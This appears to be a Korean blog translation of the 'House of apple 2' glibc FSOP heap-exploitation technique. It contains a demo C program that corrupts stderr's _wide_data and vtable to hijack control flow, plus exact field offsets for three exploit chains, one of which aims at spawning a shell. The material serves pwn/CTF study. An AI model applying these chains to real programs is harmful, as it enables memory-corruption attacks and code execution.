---
title: "House_of_apple_2"
date: 2024-08-23T09:38:12+09:00
authors: ["wiimdy"]
description: "translate House of apple 2 by roderick01"

tags: ["pwn", "FSOP"]
categories: ["PWN_DOCS"]
---

translate House of apple 2 by roderick01

<!--more-->

## 서문

- 이전에 새로운 IO 익스플로잇 방법인 `House of apple`이 제안된 적이 있습니다. 이는 `House of apple 1`의 속편으로,`IO_FILE->_wide_data`를 기반으로 익스플로잇 기법을 계속 제공하고 있습니다.
- `House of apple 1`에 대한 요약에서 `House of apple 1`의 익스플로잇 체인은 모든 주소에 주소 힙을 쓸 수 있으며, 이는 `large bin` 공격의 효과와 동일하다고 언급했습니다.
- 따라서 이후의 FSOP 익스플로잇을 위해서는 `House of apple 1`을 다른 방법과 결합해야 합니다. 그렇다면 `wide_data`만 하이재킹하는 조건에서 프로그램의 실행 흐름을 제어할 수 있을까요? 대답은 '예'입니다.
- 이 글에서 `House of apple 2`은 `_IO_FILE->_wide_data` 하이재킹을 기반으로 프로그램의 실행 흐름을 직접 제어할 수 있는 몇 가지 새로운 IO 익스플로잇 체인을 제안할 것입니다.

## 이용 조건

`House of apple 2`을 사용하기 위한 조건은 다음과 같습니다:

- 알려진 힙 주소와 glibc 주소
- 메인 함수에서 `return`, `malloc_assert`에 의해 트리거되는 종료, exit 함수 호출 등 애플리케이션의 IO 작업 실행을 제어할 수 있는 기능입니다.
- 대개 `_IO_FILE`의 vtable 및 `_wide_data` 제어하는 기능은 `largebin` 공격을 사용하여 제어합니다. |

## exploit 방법

`_IO_FILE` stdin/stdout/stderr 는 vtable`_IO_file_jumps`를 사용하며, vtable 내부의 함수 포인터를 호출해야 하는 경우 매크로를 사용하여 호출합니다. glibc에서 `_IO_file_overflow`호출을 예로 들어보면, 호출의 코드 조각은 다음과 같이 분석됩니다.

```c
#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)

#define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1)

# define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))
```

`wide_vtable` 가상 테이블 내에서 함수를 호출할 때 동일한 매크로가 사용되며, `vtable->_overflow`호출을 예로 들어보면 사용되는 매크로는 순서대로 나열됩니다:

```c
struct _IO_wide_data
{
  wchar_t *_IO_read_ptr;    /* Current read pointer */
  wchar_t *_IO_read_end;    /* End of get area. */
  wchar_t *_IO_read_base;    /* Start of putback+get area. */
  wchar_t *_IO_write_base;    /* Start of put area. */
  wchar_t *_IO_write_ptr;    /* Current put pointer. */
  wchar_t *_IO_write_end;    /* End of put area. */
  wchar_t *_IO_buf_base;    /* Start of reserve area. */
  wchar_t *_IO_buf_end;        /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  wchar_t *_IO_save_base;    /* Pointer to start of non-current get area. */
  wchar_t *_IO_backup_base;    /* Pointer to first valid character of
                   backup area */
  wchar_t *_IO_save_end;    /* Pointer to end of non-current get area. */

  __mbstate_t _IO_state;
  __mbstate_t _IO_last_state;
  struct _IO_codecvt _codecvt;
  wchar_t _shortbuf[1];
  const struct _IO_jump_t *_wide_vtable;
};
```

dd

```c
#define _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)
#define WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)->FUNC) (THIS, X1)

#define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)
#define _IO_WIDE_JUMPS(THIS)
   _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)->_wide_vtable
```

보시다시피 `_wide_vtable` 내부에서 멤버 함수 포인터를 호출할 때 vtable에 대한 적법성 검사는 없습니다. 따라서 `_IO_wfile_jumps`로 IO_FILE의 vtable을 탈취하고, `_wide_data`를 제어 가능한 힙 주소 공간으로 제어하고, 다시 `_wide_data->_wide_vtable`을 제어 가능한 힙 주소 공간으로 제어할 수 있습니다. IO 스트림 함수 호출의 실행을 제어하는`_IO_Wxxxxx`함수는 프로그램의 실행 흐름을 제어하는 마지막 호출입니다. 아래에 언급된 `_IO_wdefault_xsgetn` 함수의 활용 예시로 데모 예제는 다음과 같이 작성되어 있습니다:

```c
#include<stdio.h>
#include<stdlib.h>
#include<stdint.h>
#include<unistd.h>
#include <string.h>

void backdoor()
{
	printf("033[31m[!] Backdoor is called!n");
	_exit(0);
}

void main()
{
	setbuf(stdout, 0);
	setbuf(stdin, 0);
	setbuf(stderr, 0);

	char *p1 = calloc(0x200, 1);
	char *p2 = calloc(0x200, 1);
	puts("[*] allocate two 0x200 chunks");

	size_t puts_addr = (size_t)&puts;
	printf("[*] puts address: %pn", (void *)puts_addr);
	size_t libc_base_addr = puts_addr - 0x84420;
	printf("[*] libc base address: %pn", (void *)libc_base_addr);

	size_t _IO_2_1_stderr_addr = libc_base_addr + 0x1ed5c0;
	printf("[*] _IO_2_1_stderr_ address: %pn", (void *)_IO_2_1_stderr_addr);

	size_t _IO_wstrn_jumps_addr = libc_base_addr + 0x1e8c60;
	printf("[*] _IO_wstrn_jumps address: %pn", (void *)_IO_wstrn_jumps_addr);

	char *stderr2 = (char *)_IO_2_1_stderr_addr;
	puts("[+] step 1: change stderr->_flags to 0x800");
	*(size_t *)stderr2 = 0x800;

	puts("[+] step 2: change stderr->_mode to 1");
	*(size_t *)(stderr2 + 0xc0) = 1;

	puts("[+] step 3: change stderr->vtable to _IO_wstrn_jumps-0x20");
	*(size_t *)(stderr2 + 0xd8) = _IO_wstrn_jumps_addr-0x20;

	puts("[+] step 4: replace stderr->_wide_data with the allocated chunk p1");
	*(size_t *)(stderr2 + 0xa0) = (size_t)p1;

	puts("[+] step 5: set stderr->_wide_data->_wide_vtable with the allocated chunk p2");
	*(size_t *)(p1 + 0xe0) = (size_t)p2;

	puts("[+] step 6: set stderr->_wide_data->_wide_vtable->_IO_write_ptr >  stderr->_wide_data->_wide_vtable->_IO_write_base");
	*(size_t *)(p1 + 0x20) = (size_t)1;

	puts("[+] step 7: put backdoor at fake _wide_vtable->_overflow");
	*(size_t *)(p2 + 0x18) = (size_t)(&backdoor);

	puts("[+] step 8: call fflush(stderr) to trigger backdoor func");
	fflush(stderr);

}
```

컴파일된 출력:

```text
[*] allocate two 0x200 chunks
[*] puts address: 0x7f8f73d2e420
[*] libc base address: 0x7f8f73caa000
[*] _IO_2_1_stderr_ address: 0x7f8f73e975c0
[*] _IO_wstrn_jumps address: 0x7f8f73e92c60
[+] step 1: change stderr->_flags to 0x800
[+] step 2: change stderr->_mode to 1
[+] step 3: change stderr->vtable to _IO_wstrn_jumps-0x20
[+] step 4: replace stderr->_wide_data with the allocated chunk p1
[+] step 5: set stderr->_wide_data->_wide_vtable with the allocated chunk p2
[+] step 6: set stderr->_wide_data->_wide_vtable->_IO_write_ptr >  stderr->_wide_data->_wide_vtable->_IO_write_base
[+] step 7: put backdoor at fake _wide_vtable->_overflow
[+] step 8: call fflush(stderr) to trigger backdoor func
[!] Backdoor is called!
```

## exploit 아이디어

glibc 소스 코드에서 검색할 수 있는`_IO_WXXXXX` 시리즈 함수의 호출은 `_IO_WSETBUF, _IO_WUNDERFLOW, _IO_WDOALLOCATE`및 `_IO_WOVERFLOW`뿐입니다. 이 중`_IO_WSETBUF`와 `_IO_WUNDERFLOW`는 현재 사용 불가능하거나 악용하기 어렵고 나머지는 활용하도록 구성할 수 있습니다.
사용하기 어려운 경우, 나머지는 적절한 `_IO_FILE`을 구성하여 사용할 수 있습니다. 제가 요약한 몇 가지 더 나은 체인을 여기에 소개합니다. 다음은`_IO_FILE` 구조 변수를 참조하기 위해 fp를 사용합니다.

## `_IO_wfile_overflow`함수로 exploit 진행

### fp 설정

- `_flags`는 `~(2 | 0x8 | 0x800)`으로 설정, rdi를 제어할 필요가 없다면 0으로 설정, 셸을 가져와야 한다면 sh로 설정, 앞에 두 개의 공백이 있음에 유의
- vtable은 `_IO_wfile_jumps`로 설정합니다. (오프셋을 더하거나 뺀)
- `_wide_data`는 제어된 힙 주소 A, 즉 `*(fp + 0xa0)`를 충족하도록 설정합니다. = A
- `_wide_data->_IO_write_base`가 0으로 설정, 즉`*(A + 0x18) = 0`을 만족
- `_wide_data->_IO_buf_base`가 0으로 설정, 즉 `*(A + 0x30) = 0`을 만족
- `_ wide_data->_wide_vtable`이 제어 가능한 힙 주소 B로 설정됨, 즉 `*(A + 0xe0) = B`를 만족함
- `_wide_data->_wide_vtable->doallocate`가 RIP 하이재킹을 위해 주소 C로 설정됨, 즉`*(B + 0x68) = C`를 만족함.

함수의 호출 체인은 다음과 같습니다:

```text
_IO_wfile_overflow
    _IO_wdoallocbuf
        _IO_WDOALLOCATE
            *(fp->_wide_data->_wide_vtable + 0x68)(fp)
```

자세한 분석은 다음과 같습니다. 먼저`_IO_wfile_overflow` 함수를 살펴보세요.

### `_IO_wfile_overflow`

```c
wint_t
_IO_wfile_overflow (FILE *f, wint_t wch)
{
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0)
    {
      /* Allocate a buffer if needed. */
      if (f->_wide_data->_IO_write_base == 0)
    {
      _IO_wdoallocbuf (f);// 需要走到这里
      // ......
    }
    }
}
```

`f->_flags & _IO_NO_WRITES == 0`,`f->_flags & _IO_CURRENTLY_PUTTING == 0`, `f->_wide_data->_IO_write_base == 0`을 만족해야 합니다. 그리고 `_IO_wdoallocbuf` 함수를 살펴보자

```c
void
_IO_wdoallocbuf (FILE *fp)
{
  if (fp->_wide_data->_IO_buf_base)
    return;
  if (!(fp->_flags & _IO_UNBUFFERED))
    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)// _IO_WXXXX调用
      return;
  _IO_wsetb (fp, fp->_wide_data->_shortbuf,
             fp->_wide_data->_shortbuf + 1, 0);
}
libc_hidden_def (_IO_wdoallocbuf)
```

`fp->_wide_data->_IO_buf_base ! = 0` 및`fp->_flags & _IO_UNBUFFERED == 0`을 만족해야 합니다.

## `_IO_wfile_underflow_mmap`함수로 exploit 진행

### fp의 설정

- `_flags`는 ~4로 설정하고, rdi를 제어할 필요가 없다면 0으로 설정하고, 셸을 가져와야 한다면 sh로 설정하고, 그 앞에 공백이 있다는 점에 유의하세요
- vtable은 `_IO_wfile_jumps_mmap` 주소(플러스 또는 마이너스 오프셋)로 설정하여 `_IO_wfile_underflow_mmap`을 성공적으로 호출할 수 있도록 합니다.  
  -`_IO_read_ptr < _IO_read_end`, 즉 `*(fp + 8) < *(fp + 0x10)` 만족
- `_wide_data`는 제어 가능한 힙 주소 A, 즉 `*(fp + 0xa0) = A`로 설정됩니다.
- `_wide_data->_IO_read_ptr` >= `_wide_data>_IO_read_end`, 즉 `*A >= *(A + 8)`
- `_wide_data->_IO_buf_base`가 0으로 설정됨, 즉 `\*(A + 0x30 ) = 0 ``
- `_wide_data->_IO_save_base` 가 0 으로 설정되거나 법적으로 해제 가능한 주소, 즉 `*(A + 0x40) = 0` 을 만족
- `_wide_data->_wide_vtable` 이 제어 가능한 힙 주소 B 로 설정됨, 즉 `*(A + 0xe0) = B`
- `_wide_data->_wide_vtable->doallocate`은 RIP 하이재킹을 위해 주소 C로 설정, 즉 `*(B + 0x68) = C`를 만족합니다.
- 함수의 호출 체인은 다음과 같습니다:

```text
_IO_wfile_underflow_mmap
    _IO_wdoallocbuf
        _IO_WDOALLOCATE
            *(fp->_wide_data->_wide_vtable + 0x68)(fp)
```

자세한 분석은 다음과 같습니다:`_IO_wfile_underflow_mmap` 함수를 살펴보세요:

### `_IO_wfile_underflow_mmap`

```c
static wint_t
_IO_wfile_underflow_mmap (FILE *fp)
{
  struct _IO_codecvt *cd;
  const char *read_stop;

  if (__glibc_unlikely (fp->_flags & _IO_NO_READS))
    {
      fp->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    }
  if (fp->_wide_data->_IO_read_ptr < fp->_wide_data->_IO_read_end)
    return *fp->_wide_data->_IO_read_ptr;

  cd = fp->_codecvt;

  /* Maybe there is something left in the external buffer.  */
  if (fp->_IO_read_ptr >= fp->_IO_read_end
      /* No.  But maybe the read buffer is not fully set up.  */
      && _IO_file_underflow_mmap (fp) == EOF)
    /* Nothing available.  _IO_file_underflow_mmap has set the EOF or error
       flags as appropriate.  */
    return WEOF;

  /* There is more in the external.  Convert it.  */
  read_stop = (const char *) fp->_IO_read_ptr;

  if (fp->_wide_data->_IO_buf_base == NULL)
    {
      /* Maybe we already have a push back pointer.  */
      if (fp->_wide_data->_IO_save_base != NULL)
    {
      free (fp->_wide_data->_IO_save_base);
      fp->_flags &= ~_IO_IN_BACKUP;
    }
      _IO_wdoallocbuf (fp);// 需要走到这里
    }
    //......
}
```

`fp->_flags & _IO_NO_READS == 0`,
`fp->_wide_data->_IO_read_ptr` >= `fp->_wide_data->_IO_read_end`,
`fp->_IO_read_ptr` < `fp->_IO_read_end`를 설정해야 함.
그리고 `_IO_wdoallocbuf (fp);` 를 실행하기 위해 if 조건을 맞춰준다.
`fp->_wide_data->_IO_buf_base == NULL` 및 `fp->_wide_data->_IO_save_base == NULL`로 설정합니다.

## `_IO_wdefault_xsgetn`함수로 exploit 진행

- 이 체인이 실행되기 위한 조건은`_IO_wdefault_xsgetn`을 호출할 때 세 번째 파라미터인 rdx 레지스터가 0이 아니어야 합니다. 이 조건이 충족되지 않으면 다른 체인을 사용할 수 있습니다.

### fp 설정

- `_flags`는 0x800으로 설정

- vtable은`_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps` 주소(오프셋을 더하거나 뺀)로 설정하여 `_IO_wdefault_xsgetn`만 성공적으로 호출할 수 있도록 합니다.

- mode가 0보다 큰 값, 즉 `*(fp + 0xc0) > 0`을 만족하는 경우

- `_wide_data`가 제어 가능한 힙 주소 A로 설정된 경우, 즉 `*(fp + 0xa0) = A`

- `_wide_data->_IO_read_end == _ wide_data->_IO_read_ptr` 즉 `*(A + 8) = *A`

- `_wide_data->_IO_write_ptr > _wide_data->_IO_write_base`, 즉 `*(A + 0x20) > *(A + 0x18)` 만족한다.

- `wide_data->_wide_vtable`은 제어 가능한 힙 주소 B, 즉 `*(A + 0xe0) = B` 를 만족하는 주소로 설정됩니다

- `wide_data->_wide_vtable->overflow`는 RIP 하이재킹을 위해 주소 C, 즉 `*(B + 0x18) = C` 를 만족하는 주소로 설정됩니다. 0x18) = C

함수의 호출 체인은 다음과 같습니다.

```text
_IO_wdefault_xsgetn
    __wunderflow
        _IO_switch_to_wget_mode
            _IO_WOVERFLOW
                *(fp->_wide_data->_wide_vtable + 0x18)(fp)
```

### `_IO_wdefault_xsgetn`

```c
size_t
_IO_wdefault_xsgetn (FILE *fp, void *data, size_t n)
{
  size_t more = n;
  wchar_t *s = (wchar_t*) data;
  for (;;)
    {
      /* Data available. */
      ssize_t count = (fp->_wide_data->_IO_read_end
                       - fp->_wide_data->_IO_read_ptr);
      if (count > 0)
    {
      if ((size_t) count > more)
        count = more;
      if (count > 20)
        {
          s = __wmempcpy (s, fp->_wide_data->_IO_read_ptr, count);
          fp->_wide_data->_IO_read_ptr += count;
        }
      else if (count <= 0)
        count = 0;
      else
        {
          wchar_t *p = fp->_wide_data->_IO_read_ptr;
          int i = (int) count;
          while (--i >= 0)
        *s++ = *p++;
          fp->_wide_data->_IO_read_ptr = p;
            }
            more -= count;
        }
      if (more == 0 || __wunderflow (fp) == WEOF)
    break;
    }
  return n - more;
}
libc_hidden_def (_IO_wdefault_xsgetn)
```

more는 세 번째 인자이므로 0이 될 수 없습니다. 카운트가 0이 되고 if 브랜치에 들어가지 않도록 `fp->_wide_data->_IO_read_ptr == fp->_wide_data->_IO_read_end`를 설정하면 간단합니다. 이후 more! = 0이 되면 `__wunderflow`로 들어갑니다. 다음으로 \_\_wunderflow를 살펴봅니다:

```c
wint_t
__wunderflow (FILE *fp)
{
  if (fp->_mode < 0 || (fp->_mode == 0 && _IO_fwide (fp, 1) != 1))
    return WEOF;

  if (fp->_mode == 0)
    _IO_fwide (fp, 1);
  if (_IO_in_put_mode (fp))
    if (_IO_switch_to_wget_mode (fp) == EOF)
      return WEOF;
    // ......
}
```

`IO_switch_to_wget_mode`로 호출하려면, `fp->mode > 0` 및 `fp->_flags & _IO_CURRENTLY_PUTTING ! = 0`으로 설정합니다. 그런 다음 `_IO_switch_to_wget_mode` 함수에서:

```c
int
_IO_switch_to_wget_mode (FILE *fp)
{
  if (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)
    if ((wint_t)_IO_WOVERFLOW (fp, WEOF) == WEOF) // 需要走到这里
      return EOF;
    // .....
}
```

`fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base`가 만족될 때 `_IO_WOVERFLOW(fp)`가 호출됩니다.

## Referer

<https://bbs.kanxue.com/thread-273832.htm>
